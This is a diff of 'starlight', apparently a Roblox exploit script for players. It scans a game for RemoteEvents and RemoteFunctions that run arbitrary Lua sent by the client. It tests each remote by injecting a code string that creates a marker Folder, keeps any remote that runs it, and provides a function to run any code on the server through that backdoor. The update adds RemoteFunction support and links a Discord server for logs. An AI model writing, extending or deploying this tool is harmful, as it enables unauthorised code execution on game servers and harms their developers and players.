@@ -1,5 +1,5 @@
 -- starlight 💫
--- 0.0.6
+-- 0.0.7
 
 
 
@@ -673,105 +673,95 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 	end
 	runService.RenderStepped:Connect(updateCursor)
 	local RunService = game:GetService("RunService")
-	local excludedRemotes = {
-		"UpdateCurrentCall",
-		"CanChatWith",
-		"OnNewMessage",
-		"OnMessageDoneFiltering",
-		"OnChannelJoined",
-		"OnNewSystemMessage",
-	}
-	local function getPlayerCount()
-		local success, result = pcall(function()
-			return #Players:GetPlayers()
-		end)
-		return success and result or 0
+    local excludedRemotes = {
+	    "UpdateCurrentCall",
+	    "CanChatWith",
+	    "OnNewMessage",
+    	"OnMessageDoneFiltering",
+	    "OnChannelJoined",
+	    "OnNewSystemMessage",
+    }
+    local remoteEvent, remoteFunction, foundExploit = nil, nil, false
+    local function testRemote(remote, isFunction)
+	    if foundExploit then return end
+	    local randomId = tostring(math.random(1, 1e6))
+	    local modelName = "starlight_" .. randomId
+	    print("💫 starlight: checking Remote:", remote:GetFullName())
+	    local foundEvent = false
+	    local function onAdded(instance)
+		    if instance.Name == modelName then
+			    foundEvent = true
+		    end
+	    end
+	    local connection = workspace.DescendantAdded:Connect(onAdded)
+	    if isFunction then
+		    pcall(function()
+			    remote:InvokeServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
+		    end)
+	    else
+		    remote:FireServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
+	    end
+	    local startTime = tick()
+	    while tick() - startTime < 0.22 do
+		    if foundEvent or workspace:FindFirstChild(modelName, true) then
+			    foundEvent = true
+			    break
+		    end
+		    RunService.Heartbeat:Wait()
+	    end
+	    connection:Disconnect()
+	    if foundEvent then
+		    print("💫 starlight: backdoor found!")
+		    if not foundExploit then
+			    foundExploit = true
+			    if isFunction then
+				    remoteFunction = remote
+			    else
+				    remoteEvent = remote
+			    end
+		    end
+	    else
+		    print("💫 starlight: remote not backdoor:", remote:GetFullName())
+	    end
+    end
+    local function findRemote()
+	    local remotes = {}
+	    for _, remote in ipairs(game:GetDescendants()) do
+		    if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not table.find(excludedRemotes, remote.Name) then
+			    table.insert(remotes, remote)
+		    end
+	    end
+	    for _, remote in ipairs(remotes) do
+		    task.spawn(function()
+			    if not foundExploit then
+				    testRemote(remote, remote:IsA("RemoteFunction"))
+			    end
+		    end)
+	    end
+	    local overallTimeout = 5
+	    local start = tick()
+	    repeat task.wait(0.01) until foundExploit or (tick() - start > overallTimeout)
+	        if remoteEvent then
+		        print("💫 starlight: using backdoor (RemoteEvent):", remoteEvent:GetFullName())
+	        elseif remoteFunction then
+		        print("💫 starlight: using backdoor (RemoteFunction):", remoteFunction:GetFullName())
+	        else
+		        print("💫 starlight: no Backdoor found.")
+	        end
+        end
 	end
-	
-	
-	local remoteEvent = nil
-	local FinishedFound = false
-	local remotes = {}
-	local foundExploit = false  -- global flag to signal that an exploitable remote has been found
-	local function testRemote(remote)
-		if foundExploit then return end  -- skip if another remote is already found
-	
-		local randomId = tostring(math.random(1, 1e6))
-		local modelName = "starlight_" .. randomId
-		print("💫 starlight: checking Remote:", remote:GetFullName())
-	
-		local foundEvent = false
-	
-		local function onAdded(instance)
-			if instance.Name == modelName then
-				foundEvent = true
-			end
-		end
-	
-		local connection = workspace.DescendantAdded:Connect(onAdded)
-		remote:FireServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
-	
-		local startTime = tick()
-		while tick() - startTime < 0.22 do  -- using a short timeout (~0.22 sec)
-			if foundEvent or workspace:FindFirstChild(modelName, true) then
-				foundEvent = true
-				break
-			end
-			RunService.Heartbeat:Wait()
-		end
-	
-		connection:Disconnect()
-	
-		if foundEvent then
-			print("💫 starlight: backdoor found!")
-			if not foundExploit then
-				foundExploit = true
-				remoteEvent = remote
-	
-			end
-		else
-			print("💫 starlight: remote not backdoor:", remote:GetFullName())
-		end
-	end
-	
-	local function findRemote()
-	
-		for _, remote in ipairs(game:GetDescendants()) do
-			if remote:IsA("RemoteEvent") and not table.find(excludedRemotes, remote.Name) then
-				table.insert(remotes, remote)
-			end
-		end
-		for _, remote in ipairs(remotes) do
-			task.spawn(function()
-				if not foundExploit then
-					testRemote(remote)
-				end
-			end)
-		end
-	
-		local overallTimeout = 5
-		local start = tick()
-		repeat
-			task.wait(0.01)
-		until foundExploit or (tick() - start > overallTimeout)
-	
-		FinishedFound = true
-	
-		if remoteEvent then
-			print("💫 starlight: using backdoor:", remoteEvent:GetFullName())
-		else
-			print("💫 starlight: no Backdoor found.")
-		end
-	end
-	
-	local function fireRemoteEvent(code)
-		if remoteEvent then
-			print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
-			remoteEvent:FireServer(code)
-		else
-			warn("💫 starlight: no backdoor found, cannot execute code.")
-		end
-	end
+    local function fireRemoteEvent(code)
+	    if remoteEvent then
+		    print("ℹ️ Executing code through backdoor (RemoteEvent):", remoteEvent:GetFullName())
+		    remoteEvent:FireServer(code)
+	    elseif remoteFunction then
+		    print("ℹ️ Executing code through backdoor (RemoteFunction):", remoteFunction:GetFullName())
+		    pcall(function() remoteFunction:InvokeServer(code) end)
+	    else
+		    warn("💫 starlight: no backdoor found, cannot execute code.")
+	    end
+    end
+
 	game.StarterGui:SetCore("SendNotification",{
 		Title = "💫 starlight",
 		Text = "discord server with logs: https://discord.gg/d6d3SdJBAz",
